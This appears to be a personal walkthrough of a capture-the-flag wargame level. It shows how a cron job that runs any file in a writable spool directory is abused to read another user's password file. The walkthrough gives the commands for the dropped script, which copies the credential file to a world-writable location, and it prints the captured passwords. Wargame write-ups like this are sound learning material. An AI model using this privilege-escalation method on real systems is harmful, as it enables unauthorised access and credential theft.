the contents of /etc/cron.d/cronjob_bandit24 are:

@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

The contents of /usr/bin/cronjob_bandit24.sh are:

#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

That script is run as bandit24 user, so myname will be bandit24. Given that it executes and deletes all scripts in /var/spool/bandit24/foo directory.

So in order to get the password I have to create a script inside that directory which will copy the contents /etc/bandit_pass/bandit24 to file of my choosing.

I create a temp directory, running mktemp -d and I get /tmp/tmp.vSGpeOS24V. In this directory (cd /tmp/tmp.vSGpeOS24V) I will copy the bandit24 password, so I create a file name pass, using 'touch pass24'. Then I create the script that will do the job in the same tmp directory as a backup.   

I run:
vim pass24.sh to create the script

then I changed the permissions of pass24.sh, with chmod a+rwx pass24.sh so that it will be executable, and the permissions of pass24 with chmod a+rw pass24 so that we can write on it.

** Important: I have to change the permissions of the /tmp/tmp.vSGpeOS24V directory as well otherwise the script will not be able to write in there. the default permission of /tmp/tmp.vSGpeOS24V are 0700 so I run chmod a+rwx /tmp/tmp.vSGpeOS24V.

cp pass24.sh /var/spool/bandit24/foo/ to copy the script to the desired folder

pass24.sh contains:

#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/tmp.vSGpeOS24V/pass24

Also important: cronjob runs every minute at :00 seconds so we have to be a bit carefull when exactly we copy and everything has to be in place (use date command to check the time).

After the next minute the password of level 24 will be on pass24 file. I use cat pass24 and I get gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8.

passwd for level 24: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 (old:VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar)
